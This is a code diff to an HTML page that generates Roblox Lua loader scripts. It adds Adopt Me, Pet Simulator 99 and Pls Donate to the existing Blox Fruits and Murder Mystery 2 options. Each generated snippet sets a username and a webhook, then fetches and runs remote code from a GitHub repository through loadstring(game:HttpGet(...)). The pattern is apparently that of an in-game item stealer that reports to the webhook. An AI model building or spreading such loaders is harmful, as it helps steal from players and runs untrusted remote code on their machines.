@@ -109,6 +109,9 @@
     <div class="container">
         <button class="game-button" onclick="openPopup('Blox Fruits')">Blox Fruits</button>
         <button class="game-button" onclick="openPopup('Murder Mystery 2')">Murder Mystery 2</button>
+        <button class="game-button" onclick="openPopup('Adopt Me')">Adopt Me</button>
+        <button class="game-button" onclick="openPopup('Pet Simulator 99')">Pet Simulator 99</button>
+        <button class="game-button" onclick="openPopup('Pls Donate')">Pls Donate</button>
     </div>
 
     <div id="popup" class="popup">
@@ -143,6 +146,12 @@
                     script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits'))()`;
                 } else if (currentGame === 'Murder Mystery 2') {
                     script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Void'))()`;
+                } else if (currentGame === 'Adopt Me') {
+                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Adopt%20me'))()`;
+                } else if (currentGame === 'Pet Simulator 99') {
+                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Ps99'))()`;
+                } else if (currentGame === 'Pls Donate') {
+                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Pls%20Donate'))()`;
                 }
 
                 document.getElementById('scriptOutput').style.display = 'block';
